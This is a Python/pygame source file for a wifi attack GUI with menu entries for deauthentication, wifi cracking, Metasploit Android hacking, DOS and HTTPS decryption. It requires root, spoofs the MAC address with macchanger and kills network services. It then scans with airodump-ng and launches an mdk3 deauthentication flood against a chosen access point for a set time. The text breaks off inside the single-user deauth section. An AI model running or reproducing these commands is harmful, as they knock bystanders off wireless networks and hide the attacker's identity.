import os
import sys
import string

class color:
   BLACK = '\u001b[30m'
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   	
   BOLD = '\033[1m'
   KURSIVE = '\033[3m'
   UNDERLINE = '\033[4m'
   TIKTOK = '\033[5m'
   
   WHITEBG = '\033[47m'
   CYANBG = '\033[46m'
   PURPLEBG = '\033[45m'
   BLUEBG = '\033[44m'
   ORANGEBG = '\033[43m'
   GREENBG = '\033[42m'
   REDBG = '\033[41m'
	   
   END = '\033[0m'

os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"

with open("Data/mainHACK.py", "w+") as hackfile:
	hackfile.write("lol what u thought, DONT MOVE ANYHTHING, OK?1!")

if os.geteuid() != 0:
    sys.exit(color.RED + color.KURSIVE + "You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting." + color.END)

try:
	import pygame
except:
	os.system("pip3 install pygame")
	try:
		import pygame
	except:
		print("")
		print(color.RED + color.TIKTOK + "An error ocurred during PyGame installation! Try to install it manually using 'pip3 install pygame'. " + color.END)
		sys.exit()
		
if os.path.exists("HandshakeDATA-01.cap"):
	os.remove("HandshakeDATA-01.csv")
	os.remove("HandshakeDATA-01.kismet.csv")
	os.remove("HandshakeDATA-01.kismet.netxml")
	os.remove("HandshakeDATA-01.log.csv")
	os.remove("HandshakeDATA-01.cap")
else:
	pass

path = os.path.abspath(os.getcwd())

pygame.init()
pygame.font.init()
screenwidth = 1000
screenheight = 800
pygame.display.set_caption("Jo3l")

clock = pygame.time.Clock()

fuente = pygame.font.Font("Data/.Varino.ttf", 35)
fuentechica = pygame.font.Font("Data/.Varino.ttf", 15)

white = (255, 255,255)
black = (0, 0, 0)
onevar = 0
blackoutalpha = 0
blacktowhite = (0, 0, 0)
blacktored = (0, 0, 0)
red = (255, 0, 0)
green = (0, 255, 0)
blue  = (0, 0, 255)
grey = (200, 200, 200)

screen = pygame.display.set_mode((screenwidth, screenheight))

os.system("sudo ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d' > Data/.DEVICES.txt")

fakevars = {}
linelist = None

######################################################
#ajustes de la intro                                 #
a = pygame.image.load(f"Data/.JbsA7aSbf.png")        #
bb = pygame.image.load(f"Data/.Ag7dH8a.png")         #
bo = pygame.image.load(f"Data/.6BHv7Sa.jpg")         # 
blackout = pygame.transform.scale(bo, (1000, 800))   #
blackout.set_alpha(0)				     #
HappyF = pygame.transform.scale(a, (150, 150))       #
logorect = HappyF.get_rect()                         #
logoalpha = 0                                        #
HappyF.set_alpha(0)                                  #
						     #
pygame.display.set_icon(bb)			     #
						     #
running = True 					     #
						     #
jumpspeed = 0					     #
doneintro = False				     #
showingup = True				     #
waiting = False					     #
waitingfps = 0					     #
movingup = False				     #
slowingdown = False				     #
#################################################################
#ubicaciones posibles para el usuario				#
userinmainmenu = True						#
								#
userinDEUIN = False						#
userinDEUIN1 = False						#
userinDEUIN2 = False						#
userinDEUIN3 = False 						#
userinDEUIN4 = False						#
userinDEUIN5 = False						#
								#		
userinDEOUIN = False						#
userinDEOUIN1 = False						#
userinDEOUIN2 = False						#
userinDEOUIN3 = False						#
userinDEOUIN4 = False						#
userinDEOUIN5 = False						#
userinDEOUIN6 = False						#
								#
userinWCWD = False						#
userinWCWD1 = False						#
userinWCWD2 = False						#
userinWCWD3 = False						#
userinWCWD4 = False						#
								#
								#
userinGUIN = False						#
userinAHM = False						#
userinDOSA = False						#
userinGDHR = False						#
userinTTGWDB = False						#
								#
##################################################################################
biotxt = fuentechica.render('By Jo3l', True, blacktowhite)			 
biotxtrect = biotxt.get_rect()	


#botones y textos del DEUIN							 
DEUIN = fuentechica.render('Deauth every user in network', True, blacktowhite)   
DEUINbutton = DEUIN.get_rect()							 
DEUINbutton.x = screenwidth//2-DEUINbutton.width//2 				 
DEUINbutton.y = 300								 
										 
DEOUIN = fuentechica.render('Deauth one user in network', True, blacktowhite)    
DEOUINbutton = DEOUIN.get_rect()						 
DEOUINbutton.x = screenwidth//2-DEUINbutton.width//2 				 
DEOUINbutton.y = 350								 
										 
WCWD = fuentechica.render('Wifi cracking with dict', True, blacktowhite)	 
WCWDbutton = WCWD.get_rect()							 
WCWDbutton.x = screenwidth//2-WCWDbutton.width//2 				 
WCWDbutton.y = 400								 
										 
GUIN = fuentechica.render('Get users in network (NMAP)', True, blacktowhite)	 
GUINbutton = GUIN.get_rect()							 
GUINbutton.x = screenwidth//2-GUINbutton.width//2  				 
GUINbutton.y = 450								 
										 
AHM = fuentechica.render('Android hacking (Metasploit)', True, blacktowhite)	 
AHMbutton = AHM.get_rect()							 
AHMbutton.x = screenwidth//2-AHMbutton.width//2  				 
AHMbutton.y = 500								 
										 
DOSA = fuentechica.render('DOS attack', True, blacktowhite)	 		 
DOSAbutton = DOSA.get_rect()							 
DOSAbutton.x = screenwidth//2-DOSAbutton.width//2  				 
DOSAbutton.y = 550								 
										 
GDHR = fuentechica.render('Get decrypted HTTPS requests', True, blacktowhite)    
GDHRbutton = GDHR.get_rect()							 
GDHRbutton.x = screenwidth//2-GDHRbutton.width//2  				 
GDHRbutton.y = 600								 
										 
TTGWDB = fuentechica.render('Try to get website databases', True, blacktowhite)  
TTGWDBbutton = TTGWDB.get_rect()						 
TTGWDBbutton.x = screenwidth//2-TTGWDBbutton.width//2  				
TTGWDBbutton.y = 650								
							
#DEUIN TEXTS AND BUTTONS			 
enterdata = fuentechica.render('This attack will deauth every user in a network', True, white)  
enterdatarect = enterdata.get_rect()						 
enterdatarect.x = screenwidth//2-enterdatarect.width//2 			 
enterdatarect.y = screenheight//2-enterdatarect.height//2-50 			 
										 
enter = fuente.render('[ ENTER to continue ]', True, red)          		 
enterrect = enter.get_rect()							 
enterrect.x = screenwidth//2-enterrect.width//2 				 
enterrect.y = screenheight//2-enterrect.height//2	

interfacesdata = fuente.render('Avaliable interfaces:', True, red)          		 
interfacesdatarect = interfacesdata.get_rect()							 
interfacesdatarect.x = screenwidth//2-interfacesdatarect.width//2 				 
interfacesdatarect.y = screenheight//2-interfacesdatarect.height//2-300	

attacktimedata = fuente.render('Attack time in seconds (int)', True, red)          		 
attacktimedatarect = attacktimedata.get_rect()							 
attacktimedatarect.x = screenwidth//2-attacktimedatarect.width//2
attacktimedatarect.y = screenheight//2-150

startingadv1= fuente.render('asdgASYasdv', True, red)          		 
startingadv1rect = startingadv1.get_rect()							 
startingadv1rect.x = screenwidth//2-startingadv1rect.width//2
startingadv1rect.y = screenheight//2-startingadv1rect.height//2

timerenderstring = ""
tiemporender = fuentechica.render('', True, red)          		 
tiemporenderrect = tiemporender.get_rect()							 
tiemporenderrect.x = screenwidth//2-tiemporenderrect.width//2
tiemporenderrect.y = screenheight//2-tiemporenderrect.height//2

timetxtbox = pygame.Rect(425, 375, 150, 50)
pressedtimetxtbox = False		 
													
			 
#botones y textos del DEOUIN
enterdataDEOUIN = fuentechica.render('This attack will deauth one user in a network', True, white)  
enterdataDEOUINrect = enterdataDEOUIN.get_rect()						 
enterdataDEOUINrect.x = screenwidth//2-enterdataDEOUINrect.width//2 			 
enterdataDEOUINrect.y = screenheight//2-enterdataDEOUINrect.height//2-50 			 
										 
enter = fuente.render('[ ENTER to continue ]', True, red)          		 
enterrect = enter.get_rect()							 
enterrect.x = screenwidth//2-enterrect.width//2 				 
enterrect.y = screenheight//2-enterrect.height//2

stationstxt = fuente.render('Clients in network:', True, red)          		 
stationstxtrect = stationstxt.get_rect()							 
stationstxtrect.x = screenwidth//2-stationstxtrect.width//2 				 
stationstxtrect.y = 100

gethstxt = fuente.render('Getting handshake...', True, red)          		 
gethstxtrect = gethstxt.get_rect()							 
gethstxtrect.x = screenwidth//2-gethstxtrect.width//2 				 
gethstxtrect.y = screenheight//2-gethstxtrect.height//2

##################################################################################
#variables del DEUIN
transitiondone = False
startadding = False
importantlines = []
finallines = []
wirdevices = []
finallines = []
finaldevice = ""

#variables del DEOUIN
importantstationlines = []
finalstationlines = []

#variables del WCWD
fpscounting = 0

#consiguiendo los dispositivos de red y agregandolos a una lista
try:
	with open("Data/.DEVICES.txt", "r") as devicesfile:
		for line in devicesfile:
			wirdevices.append(line[:-2])
except:
	print("U moved something :/, so something went wrong...")
	sys.exit() 

primeraposdev = 100 
for dev in wirdevices:
	primeraposdev += 100
	fakevars[f'{primeraposdev}'] = f'{dev}'

while running:
	if userinmainmenu:
		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				running = False
			#si apreta el mouse
			elif event.type == pygame.MOUSEBUTTONDOWN:
				#conseguimos la ubicacion y chequeamos si toco algo
				mousepos = pygame.mouse.get_pos()
				
				if DEUINbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinDEUIN = True
					userinDEUIN1 = True
					
				elif DEOUINbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinDEOUIN = True
					userinDEOUIN1 = True
					
				elif WCWDbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinWCWD = True
					userinWCWD1 = True
				
				elif GUINbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinGUIN = True
					
				elif AHMbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinAHM = True
					
				elif DOSAbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinDOSA = True
					
				elif GDHRbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinGDHR = True
				
				elif TTGWDBbutton.collidepoint(mousepos):
					userinmainmenu = False
					userinTTGWDB = True
					
				
			
		#lo que aparece y se va para arriba smooth
		while not doneintro:
			for event in pygame.event.get():
				if event.type == pygame.QUIT:
					os.system("clear")
					pygame.QUIT
					sys.exit()
			if showingup:
				if logoalpha != 255:
					logoalpha += 3
					HappyF.set_alpha(logoalpha)
					screen.fill(black)
					screen.blit(HappyF, (screenwidth//2 - logorect.width//2, screenheight//2 - logorect.height//2))
					pygame.display.flip()
				else:
					showingup = False
					waiting = True

			if waiting:
				waitingfps += 1
				screen.fill(black)
				screen.blit(HappyF, (screenwidth//2 - logorect.width//2, screenheight//2 - logorect.height//2))
				pygame.display.flip()
				if waitingfps == 60:
					logorect = HappyF.get_rect()
					logorect.x = screenwidth//2 - logorect.width//2
					logorect.y = screenheight//2 - logorect.height//2
					waiting = False
					movingup = True

			if movingup:
				if onevar != 255:
					onevar += 3
					blacktowhite = (onevar, onevar, onevar)
					blacktored = (onevar, 0, 0)
					#textos cambiando de color aca
					mousepos = pygame.mouse.get_pos()
					if DEUINbutton.collidepoint(mousepos):
						DEUIN = fuentechica.render('Deauth every user in network', True, blacktored)
					else:
						DEUIN = fuentechica.render('Deauth every user in network', True, blacktowhite)
						
					if DEOUINbutton.collidepoint(mousepos):
						DEOUIN = fuentechica.render('Deauth one user in network', True, blacktored)
					else:
						DEOUIN = fuentechica.render('Deauth one user in network', True, blacktowhite)
					
					if WCWDbutton.collidepoint(mousepos):
						WCWD = fuentechica.render('Wifi cracking with dict', True, blacktored)
					else:
						WCWD = fuentechica.render('Wifi cracking with dict', True, blacktowhite)
					
					if GUINbutton.collidepoint(mousepos):
						GUIN= fuentechica.render('Get users in network (NMAP)', True, blacktored)
					else:
						GUIN = fuentechica.render('Get users in network (NMAP)', True, blacktowhite)
					
					if AHMbutton.collidepoint(mousepos):
						AHM = fuentechica.render('Android hacking (Metasploit)', True, blacktored)
					else:
						AHM = fuentechica.render('Android hacking (Metasploit)', True, blacktowhite)
					
					if DOSAbutton.collidepoint(mousepos):
						DOSA = fuentechica.render('DOS attack', True, blacktored)
					else:
						DOSA = fuentechica.render('DOS attack', True, blacktowhite)
					
					if GDHRbutton.collidepoint(mousepos):
						GDHR = fuentechica.render('Get decrypted HTTPS requests', True, blacktored)
					else:
						GDHR = fuentechica.render('Get decrypted HTTPS requests', True, blacktowhite)
					
					if TTGWDBbutton.collidepoint(mousepos):
						TTGWDB = fuentechica.render('Try to get website databases', True, blacktored)
					else:
						TTGWDB = fuentechica.render('Try to get website databases', True, blacktowhite)
		
					biotxt = fuentechica.render('By Jo3l', True, blacktowhite)
				
				if not slowingdown:
					if 5.5 > jumpspeed:
						jumpspeed += 0.2
						logorect.y -= jumpspeed
						screen.fill(black)
						screen.blit(HappyF, (logorect.x, logorect.y))
						screen.blit(DEUIN, (screenwidth//2-DEUINbutton.width//2, 300))
						screen.blit(DEOUIN, (screenwidth//2-DEOUINbutton.width//2, 350))
						screen.blit(WCWD, (screenwidth//2-WCWDbutton.width//2, 400))
						screen.blit(GUIN, (screenwidth//2-GUINbutton.width//2, 450))
						screen.blit(AHM, (screenwidth//2-AHMbutton.width//2, 500))
						screen.blit(DOSA, (screenwidth//2-DOSAbutton.width//2, 550))
						screen.blit(GDHR, (screenwidth//2-GDHRbutton.width//2, 600))
						screen.blit(TTGWDB, (screenwidth//2-TTGWDBbutton.width//2, 650))
						screen.blit(biotxt, (screenwidth//2-biotxtrect.width//2, 20))
						pygame.display.flip()
					elif jumpspeed >= 5:
						slowingdown = True
				if slowingdown:
					if jumpspeed > 0:
						jumpspeed -= 0.1
						logorect.y -= jumpspeed
						screen.fill(black)
						screen.blit(HappyF, (logorect.x, logorect.y))
						screen.blit(DEUIN, (screenwidth//2-DEUINbutton.width//2, 300))
						screen.blit(DEOUIN, (screenwidth//2-DEOUINbutton.width//2, 350))
						screen.blit(WCWD, (screenwidth//2-WCWDbutton.width//2, 400))
						screen.blit(GUIN, (screenwidth//2-GUINbutton.width//2, 450))
						screen.blit(AHM, (screenwidth//2-AHMbutton.width//2, 500))
						screen.blit(DOSA, (screenwidth//2-DOSAbutton.width//2, 550))
						screen.blit(GDHR, (screenwidth//2-GDHRbutton.width//2, 600))
						screen.blit(TTGWDB, (screenwidth//2-TTGWDBbutton.width//2, 650))
						screen.blit(biotxt, (screenwidth//2-biotxtrect.width//2, 20))
						pygame.display.flip()
					else:
						doneintro = True
						
	
			clock.tick(60)
			
		#se pone rojo si tiene el mouse encima	
		mousepos = pygame.mouse.get_pos()
		if DEUINbutton.collidepoint(mousepos):
			DEUIN = fuentechica.render('Deauth every user in network', True, blacktored)
		else:
			DEUIN = fuentechica.render('Deauth every user in network', True, blacktowhite)
		
		if DEOUINbutton.collidepoint(mousepos):
			DEOUIN = fuentechica.render('Deauth one user in network', True, blacktored)
		else:
			DEOUIN = fuentechica.render('Deauth one user in network', True, blacktowhite)
		
		if WCWDbutton.collidepoint(mousepos):
			WCWD = fuentechica.render('Wifi cracking with dict', True, blacktored)
		else:
			WCWD = fuentechica.render('Wifi cracking with dict', True, blacktowhite)
		
		if GUINbutton.collidepoint(mousepos):
			GUIN= fuentechica.render('Get users in network (NMAP)', True, blacktored)
		else:
			GUIN = fuentechica.render('Get users in network (NMAP)', True, blacktowhite)
		
		if AHMbutton.collidepoint(mousepos):
			AHM = fuentechica.render('Android hacking (Metasploit)', True, blacktored)
		else:
			AHM = fuentechica.render('Android hacking (Metasploit)', True, blacktowhite)
		
		if DOSAbutton.collidepoint(mousepos):
			DOSA = fuentechica.render('DOS attack', True, blacktored)
		else:
			DOSA = fuentechica.render('DOS attack', True, blacktowhite)
		
		if GDHRbutton.collidepoint(mousepos):
			GDHR = fuentechica.render('Get decrypted HTTPS requests', True, blacktored)
		else:
			GDHR = fuentechica.render('Get decrypted HTTPS requests', True, blacktowhite)
			
		if TTGWDBbutton.collidepoint(mousepos):
			TTGWDB = fuentechica.render('Try to get website databases', True, blacktored)
		else:
			TTGWDB = fuentechica.render('Try to get website databases', True, blacktowhite)
			
		if userinmainmenu:
			screen.fill(black)
			screen.blit(HappyF, (logorect.x, logorect.y))
			screen.blit(DEUIN, (screenwidth//2-DEUINbutton.width//2, 300))
			screen.blit(DEOUIN, (screenwidth//2-DEOUINbutton.width//2, 350))
			screen.blit(WCWD, (screenwidth//2-WCWDbutton.width//2, 400))
			screen.blit(GUIN, (screenwidth//2-GUINbutton.width//2, 450))
			screen.blit(AHM, (screenwidth//2-AHMbutton.width//2, 500))
			screen.blit(DOSA, (screenwidth//2-DOSAbutton.width//2, 550))
			screen.blit(GDHR, (screenwidth//2-GDHRbutton.width//2, 600))
			screen.blit(TTGWDB, (screenwidth//2-TTGWDBbutton.width//2, 650))
			screen.blit(biotxt, (screenwidth//2-biotxtrect.width//2, 20))
			pygame.display.flip()
			clock.tick(60)
		
		else:
			#si toco algo, el usermainmenu es false, entonces hace esta transicion a negro
			while blackoutalpha != 255:
				blackoutalpha += 5
				blackout.set_alpha(blackoutalpha)
				screen.fill(black)
				screen.blit(HappyF, (logorect.x, logorect.y))
				screen.blit(DEUIN, (screenwidth//2-DEUINbutton.width//2, 300))
				screen.blit(DEOUIN, (screenwidth//2-DEOUINbutton.width//2, 350))
				screen.blit(WCWD, (screenwidth//2-WCWDbutton.width//2, 400))
				screen.blit(GUIN, (screenwidth//2-GUINbutton.width//2, 450))
				screen.blit(AHM, (screenwidth//2-AHMbutton.width//2, 500))
				screen.blit(DOSA, (screenwidth//2-DOSAbutton.width//2, 550))
				screen.blit(GDHR, (screenwidth//2-GDHRbutton.width//2, 600))
				screen.blit(TTGWDB, (screenwidth//2-TTGWDBbutton.width//2, 650))
				screen.blit(biotxt, (screenwidth//2-biotxtrect.width//2, 20))
				screen.blit(blackout, (0, 0))
				pygame.display.flip()
				clock.tick(60)
				
	elif userinDEUIN:
		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				running = False
			if userinDEUIN1:
				if event.type == pygame.KEYDOWN:
					kbstate = pygame.key.get_pressed()
					if kbstate[pygame.K_RETURN]:
						userinDEUIN1 = False
						userinDEUIN2 = True
						transitiondone = False
						#transicion a negro
						while blackoutalpha != 255:
							blackoutalpha += 5
							blackout.set_alpha(blackoutalpha)
							screen.fill(black)
							screen.blit(enter, (enterrect.x, enterrect.y))
							screen.blit(enterdata, (enterdatarect.x, enterdatarect.y))
							screen.blit(blackout, (0, 0))
							pygame.display.flip()
							clock.tick(60)
						transitiondone = False
			elif userinDEUIN2:
				if event.type == pygame.MOUSEBUTTONDOWN:
					#si hace click en alguno
					mousepos = pygame.mouse.get_pos()
					for key,value in fakevars.items():
						deviter = fuente.render(f'{value}', True, white)
						deviterrect = deviter.get_rect()
						deviterrect.x = screenwidth//2-deviterrect.width//2
						deviterrect.y = int(key)
						if deviterrect.collidepoint(mousepos):
							finaldevice = f"{value}"
							userinDEUIN2 = False
							userinDEUIN3 = True
							transitiondone = False
							os.system(f"sudo ifconfig {finaldevice} down")
							os.system(f"sudo macchanger -r {finaldevice}")
							os.system(f"sudo ifconfig {finaldevice} up")
							os.system(f"sudo airmon-ng start {finaldevice}")
							os.system("sudo pkill dhclient && pkill wpa_supplicant")
							os.system(f"sudo timeout --foreground 12s airodump-ng {finaldevice}mon > Data/.NEARWIFIs.txt")
							#transicion a negro
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
								for key,value in fakevars.items():
									deviter = fuente.render(f'{value}', True, white)
									deviterrect = deviter.get_rect()
									deviterrect.x = screenwidth//2-deviterrect.width//2
									deviterrect.y = int(key)
									if deviterrect.collidepoint(mousepos):
										deviter = fuente.render(f'{value}', True, red)
									else:
										pass
									screen.blit(deviter, (deviterrect.x, deviterrect.y))
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
							transitiondone = False
						else:
							pass
							
			elif userinDEUIN3:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					mindataheight = 100
					for data in finallines:
						beacondataline = fuentechica.render(f'{data}', True, white)
						beacondatalinerect = beacondataline.get_rect()
						beacondatalinerect.x = 10
						beacondatalinerect.y = mindataheight
						if beacondatalinerect.collidepoint(mousepos):
							beacondataline = fuentechica.render(f'{data}', True, red)
							transitiondone = False
							#a negro
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								mindataheight = 100
								for data in finallines:
									beacondataline = fuentechica.render(f'{data}', True, white)
									beacondatalinerect = beacondataline.get_rect()
									beacondatalinerect.x = 10
									beacondatalinerect.y = mindataheight
									if beacondatalinerect.collidepoint(mousepos):
										beacondataline = fuentechica.render(f'{data}', True, red)
										data2 = data
									else:
										pass
									screen.blit(beacondataline, (10, mindataheight))
									mindataheight += 50
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
							transitiondone = False
							
							definitivebssid = data2[:17]
							definitivechannel = ""
							dc = data2[47:51]
							for char in dc:
								if char in string.digits:
									definitivechannel += f"{char}"
							
							userinDEUIN3 = False
							userinDEUIN4 = True
						else:
							pass
						mindataheight += 50
						
			elif userinDEUIN4:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					if timetxtbox.collidepoint(mousepos):
						pressedtimetxtbox = True
					else:
						pressedtimetxtbox = False
				elif event.type == pygame.KEYDOWN and pressedtimetxtbox:
					kbstate = pygame.key.get_pressed()
					if len(timerenderstring) < 6:
						if event.unicode in string.digits:
							timerenderstring += event.unicode
							
					if kbstate[pygame.K_BACKSPACE]:
						timerenderstring = timerenderstring[:-1]
						
					if kbstate[pygame.K_RETURN]:
						startingadv1= fuente.render(f'Starting attack for {timerenderstring}s', True, red)
						startingadv1rect = startingadv1.get_rect()
						startingadv1rect.x = screenwidth//2-startingadv1rect.width//2
						startingadv1rect.y = screenheight//2-startingadv1rect.height//2
						
						userinDEUIN4 = False
						userinDEUIN5 = True
						transitiondone = False
						#a negro
						while blackoutalpha != 255:
							blackoutalpha += 5
							blackout.set_alpha(blackoutalpha)
							screen.fill(black)
							screen.blit(attacktimedata, (attacktimedatarect.x, attacktimedatarect.y))
							screen.blit(tiemporender, (tiemporenderrect.x, tiemporenderrect.y))
							if not pressedtimetxtbox:
								pygame.draw.rect(screen, white, timetxtbox, 4)
							else:
								pygame.draw.rect(screen, red, timetxtbox, 4)
							screen.blit(blackout, (0, 0))
							pygame.display.flip()
							clock.tick(60)
						transitiondone = False
					
					tiemporender = fuentechica.render(timerenderstring, True, red) 
					tiemporenderrect = tiemporender.get_rect()							 
					tiemporenderrect.x = screenwidth//2-tiemporenderrect.width//2
					tiemporenderrect.y = screenheight//2-tiemporenderrect.height//2
				
					
			else:
				userinDEUIN = False
					
						
		
		#si esta en la parte de apretar enter
		if userinDEUIN1:
		#transicion de negro a mostrar todo
			if not transitiondone:
				while blackoutalpha != 0:
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(enter, (enterrect.x, enterrect.y))
					screen.blit(enterdata, (enterdatarect.x, enterdatarect.y))
					#aca todo
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
			
			screen.fill(black)
			screen.blit(enter, (enterrect.x, enterrect.y))
			screen.blit(enterdata, (enterdatarect.x, enterdatarect.y))
			pygame.display.flip()
			clock.tick(60)
		
		#si esta en la parte de despues de apretar enter
		elif userinDEUIN2:
			mousepos = pygame.mouse.get_pos()
			#transicion por milesima vez jasjajs
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
					for key,value in fakevars.items():
						deviter = fuente.render(f'{value}', True, white)
						deviterrect = deviter.get_rect()
						deviterrect.x = screenwidth//2-deviterrect.width//2
						deviterrect.y = int(key)
						if deviterrect.collidepoint(mousepos):
							deviter = fuente.render(f'{value}', True, red)
						else:
							pass
						screen.blit(deviter, (deviterrect.x, deviterrect.y))
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
			
			screen.fill(black)
			screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
			for key,value in fakevars.items():
				deviter = fuente.render(f'{value}', True, white)
				deviterrect = deviter.get_rect()
				deviterrect.x = screenwidth//2-deviterrect.width//2
				deviterrect.y = int(key)
				if deviterrect.collidepoint(mousepos):
					deviter = fuente.render(f'{value}', True, red)
				else:
					pass
				screen.blit(deviter, (deviterrect.x, deviterrect.y))
			pygame.display.flip()
			clock.tick(60)
			
		elif userinDEUIN3:
			mousepos = pygame.mouse.get_pos()
			#transicion
			if not transitiondone:
				with open("Data/.NEARWIFIs.txt", "r") as devsfiles:
					linelist = devsfiles.readlines()
				for line in reversed(linelist):
					if "STATION" in line: 
						startadding = True
						continue
					
					if "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" in line:
						break
											
					if startadding:
						if "[0K[1B " in line and "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" not in line:
							importantlines.append(line[9:-4])
						else:
							if line[0] != " ":
								importantlines.append(line[:-4])
							else:
								importantlines.append(line[1:-4])
						
				for line in reversed(importantlines):
					finallines.append(line)
				
				mindataheight = 0
				
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					mindataheight = 100
					for data in finallines:
						beacondataline = fuentechica.render(f'{data}', True, white)
						beacondatalinerect = beacondataline.get_rect()
						beacondatalinerect.x = 10
						beacondatalinerect.y = mindataheight
						if beacondatalinerect.collidepoint(mousepos):
							beacondataline = fuentechica.render(f'{data}', True, red)
						else:
							pass
						screen.blit(beacondataline, (10, mindataheight))
						mindataheight += 50
						
						
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
				
			
			screen.fill(black)
			mindataheight = 100
			for data in finallines:
				beacondataline = fuentechica.render(f'{data}', True, white)
				beacondatalinerect = beacondataline.get_rect()
				beacondatalinerect.x = 10
				beacondatalinerect.y = mindataheight
				if beacondatalinerect.collidepoint(mousepos):
					beacondataline = fuentechica.render(f'{data}', True, red)
				else:
					pass
				screen.blit(beacondataline, (10, mindataheight))
				mindataheight += 50
				
			pygame.display.flip()
			clock.tick(60)
			
			
		elif userinDEUIN4:
			#definitivebssid definitivechannel
			#transicion a color
			if not transitiondone:
				while blackoutalpha != 0:
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(attacktimedata, (attacktimedatarect.x, attacktimedatarect.y))
					screen.blit(tiemporender, (tiemporenderrect.x, tiemporenderrect.y))
					pygame.draw.rect(screen, white, timetxtbox, 4)
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
				
			screen.fill(black)
			screen.blit(attacktimedata, (attacktimedatarect.x, attacktimedatarect.y))
			screen.blit(tiemporender, (tiemporenderrect.x, tiemporenderrect.y))
			if not pressedtimetxtbox:
				pygame.draw.rect(screen, white, timetxtbox, 4)
			else:
				pygame.draw.rect(screen, red, timetxtbox, 4)
			#cosas aca
			pygame.display.flip()
			clock.tick(60)
			
		elif userinDEUIN5:
			if not transitiondone:
				while blackoutalpha != 0:
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(startingadv1, (startingadv1rect.x, startingadv1rect.y))
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
					
			screen.fill(black)
			screen.blit(startingadv1, (startingadv1rect.x, startingadv1rect.y))
			pygame.display.flip()
			clock.tick(60)
			os.system(f"sudo timeout --foreground {timerenderstring}s mdk3 {finaldevice}mon d -c {definitivechannel}")
			os.system("clear")
			print(color.BOLD + color.GREEN + "Attack finished" + color.END)
			os.system(f"sudo airmon-ng stop {finaldevice}mon")
			sys.exit()
			
#----------------------------------------------------------DEOUIN---------------------------------------------------------------------------------
			
	elif userinDEOUIN:
		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				running = False
			if userinDEOUIN1:
				if event.type == pygame.KEYDOWN:
					kbstate = pygame.key.get_pressed()
					if kbstate[pygame.K_RETURN]:
						userinDEOUIN1 = False
						userinDEOUIN2 = True
						transitiondone = False
						#transicion a negro
						while blackoutalpha != 255:
							blackoutalpha += 5
							blackout.set_alpha(blackoutalpha)
							screen.fill(black)
							screen.blit(enter, (enterrect.x, enterrect.y))
							screen.blit(enterdataDEOUIN, (enterdataDEOUINrect.x, enterdataDEOUINrect.y))
							screen.blit(blackout, (0, 0))
							pygame.display.flip()
							clock.tick(60)
							
			elif userinDEOUIN2:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					for key,value in fakevars.items():
						deviter = fuente.render(f'{value}', True, white)
						deviterrect = deviter.get_rect()
						deviterrect.x = screenwidth//2-deviterrect.width//2
						deviterrect.y = int(key)
						if deviterrect.collidepoint(mousepos):
							#DECLARAMOS QUE INTERFAZ VOY A USAR
							finaldevice = f"{value}"
							os.system(f"sudo ifconfig {finaldevice} down")
							os.system(f"sudo macchanger -r {finaldevice}")
							os.system(f"sudo ifconfig {finaldevice} up")
							os.system(f"sudo airmon-ng start {finaldevice}")
							os.system("sudo pkill dhclient && pkill wpa_supplicant")
							os.system(f"sudo timeout --foreground 12s airodump-ng {finaldevice}mon > Data/.NEARWIFIs.txt")
							userinDEOUIN2 = False
							userinDEOUIN3 = True
							transitiondone = False
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
								for key,value in fakevars.items():
